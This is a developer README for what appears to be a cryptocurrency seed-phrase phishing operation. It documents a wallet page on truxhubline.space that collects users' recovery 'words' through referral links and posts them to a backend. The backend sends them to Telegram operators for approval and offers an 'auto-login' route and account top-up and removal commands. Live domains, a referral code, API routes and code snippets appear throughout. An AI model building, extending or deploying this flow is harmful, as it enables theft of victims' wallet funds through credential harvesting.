# Referral Word Submission Flow

**Status: Done for the client demo.**

The client referral flow is already connected. A user opens a referral URL, submits words, and the backend sends the Telegram alert according to the Telegram user's level.

## Client referral link

The frontend site is:

```text
https://truxhubline.space
```

Use this referral link format:

```text
https://truxhubline.space/?ref=REFERRAL_CODE
```

Example:

```text
https://truxhubline.space/?ref=abc123456789
```

### Where the referral code currently exists

The backend creates the code in:

```text
backend/routes/referrals.js
```
// GET /api/referrals - List referral links
router.get('/', async (req, res) => {
  res.json({ referrals: await db.query('SELECT id,code,name,active,created_at FROM referral_links ORDER BY id DESC') });
});

The `POST /api/referrals` handler generates a 24-character hexadecimal code,
stores it in the `referral_links.code` database column, and returns it in the
response:

```js
const code = crypto.randomBytes(12).toString('hex')
await db.execute('INSERT INTO referral_links (code,name) VALUES (?,?)', [code, name])
res.status(201).json({ code, path: `/?ref=${code}` })
```

The admin referral page that displays and builds the public URL is:

```text
client/src/pages/ReferralsPage.jsx
```

Its current URL builder is:

```js
function referralUrl(referral) {
  return `${publicUrl}/?ref=${encodeURIComponent(referral.code)}`
}
```

The current word-submission consumer is `frontend/src/pages/AddExistingWalletPage/AddExistingWalletPage.jsx`.
That page reads `ref` and sends it to the backend as `referral`:

```js
const referralCode = new URLSearchParams(window.location.search).get('ref') || ''

await api.post('/words', {
  title,
  words,
  referral: referralCode || undefined,
})
```

The public referral link opens the production frontend. The separate
`/client?ref=CODE` route on the admin application is retained only for admin
testing.

The currently generated client link is:

```text
https://truxhubline.space/?ref=be45b878370988bd0b6a48fa
```

When testing, open that URL, submit the words, and confirm in the browser
network request that `POST /api/words` contains:

```json
{
  "referral": "be45b878370988bd0b6a48fa"
}
```

The backend API base URL is:

```text
https://api.truxhubline.space
```

## Client word submission

The client page reads the `ref` query parameter and sends it with the word submission. Use one of these request bodies with the same endpoint.

### Referral campaign

```http
POST https://api.truxhubline.space/api/words
Content-Type: application/json

{
  "title": "Client visit",
  "words": "market river window signal yellow",
  "referral": "abc123456789"
}
```

This resolves `abc123456789` to its active referral-link name and the Telegram approval alert shows `Campaign: <campaign name>`.

### Main campaign (no referral)

```http
POST https://api.truxhubline.space/api/words
Content-Type: application/json

{
  "title": "Client visit",
  "words": "market river window signal yellow"
}
```

The Telegram approval alert for this request shows `Campaign: Main`.

The client already reads `ref` and sends it as `referral`. The words router resolves that referral code to its active campaign name and includes `Campaign: <name>` in the Telegram approval alert. Submissions without a valid active referral are labeled `Campaign: Main`.

```js
const referralCode = new URLSearchParams(window.location.search).get('ref') || ''

await api.post('/words', {
  title,
  words,
  referral: referralCode || undefined,
})
```

The backend route is:

```text
POST https://api.truxhubline.space/api/words
```

If the words do not already belong to an account, the backend sends an approval notification to Telegram. The referral code is passed into the Telegram recipient filter.

## Telegram alert levels

- **Level 1:** receives every word approval alert.
- **Level 2:** receives alerts only when the submitted referral code is assigned to that Telegram user and the referral link is active.

## Telegram admin flow status

The Telegram webhook and alert delivery are connected. The current bot flow is:

1. A Telegram user sends `/start` to the bot.
2. The bot stores the chat as pending.
3. An authorized Telegram user can approve or reject word alerts with the inline buttons.
4. Authorized users can use `Account List`, `Account Help`, `/account show`, `/account topup`, and `/account remove`.
5. `Stop Alerts` or `/stop` disables alerts for that chat.

Assigning a new Telegram user to level 1 or level 2 is done through the web admin or referral access API:

```http
PUT https://api.truxhubline.space/api/referrals/telegram-users/TELEGRAM_CHAT_ID
Content-Type: application/json

{
  "alertLevel": "level2",
  "authorized": true,
  "referralIds": [12]
}
```

The web admin Telegram authorization flow, client referral submission, and alert filtering are done.

## Client routes

| Method | Route | Purpose |
| --- | --- | --- |
| `POST` | `/api/words` | Submit words with an optional `referral` code |
| `GET` | `/api/words/:id/status` | Check approval status |
| `POST` | `/api/words/auto-login` | Log in using the submitted words |
## Telegram webhook routes

The Telegram router is available at both `/telegram` and `/api/telegram`. The deployed API uses:

```text
https://api.truxhubline.space/api/telegram
```

The webhook URL is:

```text
https://api.truxhubline.space/api/telegram/webhook/<TELEGRAM_WEBHOOK_SECRET>
```

| Method | Route | Purpose |
| --- | --- | --- |
| `POST` | `/api/telegram/set-webhook` | Set the Telegram webhook |
| `POST` | `/api/telegram/reset-webhook` | Reset the Telegram webhook |
| `POST` | `/api/telegram/delete-webhook` | Delete the Telegram webhook |
| `GET` | `/api/telegram/status` | Check Telegram configuration |
| `GET` | `/api/telegram/webhook-info` | Inspect the Telegram webhook |
| `POST` | `/api/telegram/webhook/:secret` | Receive Telegram updates |

## Completed demo flow

1. A user opens `https://truxhubline.space/?ref=CODE`; admins can use the separate `/client?ref=CODE` test route on the admin site.
2. Submit words.
3. The backend sends the alert to level 1 users.
4. The backend sends the alert to level 2 users only when the referral is assigned to them.

This client flow is done. No web-admin page is required for the client submission flow.
